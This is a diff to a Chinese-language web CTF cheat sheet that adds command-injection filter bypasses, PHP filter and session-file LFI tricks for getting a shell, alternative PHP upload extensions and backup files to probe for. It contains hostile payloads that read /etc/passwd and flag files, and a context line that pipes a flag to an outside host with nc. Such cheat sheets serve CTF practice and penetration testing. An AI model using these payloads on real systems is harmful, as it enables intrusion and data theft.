@@ -502,6 +502,8 @@ cat $(ls)
 "; cat $(ls)
 `cat flag | nc kaibro.tw 5278`
 
+. flag
+PS1=$(cat flag)
 ```
 
 ## ? and *
@@ -521,6 +523,9 @@ cat $(ls)
 - `cat</etc/passwd`
 - `{cat,/etc/passwd}`
 - `X=$'cat\x20/etc/passwd'&&$X`
+- ``` IFS=,;`cat<<<uname,-a` ```
+    - bash only
+
 
 ## Keyword繞過
 
@@ -1135,6 +1140,7 @@ HQL injection example (pwn2win 2017)
 ## php://filter
 
 - `php://filter/convert.base64-encode/resource=index.php`
+- `php://filter/read=string.rot13/resource=index.php`
 
 ## php://input
 
@@ -1147,6 +1153,16 @@ HQL injection example (pwn2win 2017)
 - 對server以form-data上傳文件，會產生tmp檔
 - 利用phpinfo得到tmp檔路徑和名稱
 - Get shell
+
+## php session
+
+- Session一般存在`sess_{PHPSESSID}`中
+- 可以透過修改Cookie再LFI拿shell
+- 以下為常見存放路徑
+    - /var/tmp/
+    - /tmp/
+    - /var/lib/php5/
+    - /var/lib/php/
 
 ## data://
 
@@ -1193,9 +1209,12 @@ HQL injection example (pwn2win 2017)
     - Windows特性
     - .php(空格)  // burp修改
     - .asp.
-- php345
+- php3457
     - .php3
     - .php4
+    - .php5
+    - .php7
+    - .pht
     - .phtml
 - .htaccess
     ```
@@ -1871,10 +1890,11 @@ state[i] = state[i-3] + state[i-31]`
      - robots.txt
      - .DS_Store
      - .htaccess
+     - .pyc
      - server-status
      - crossdomain.xml
      - admin/ manager/ login/ backup/ wp-login/ phpMyAdmin/
-     - xxx.php.bak / www.tar.gz / xxx.php.swp / xxx.php~
+     - xxx.php.bak / www.tar.gz / xxx.php.swp / xxx.php~ / xxx.phps
      - /WEB-INF/web.xml
  - 文件解析漏洞
      - Apache
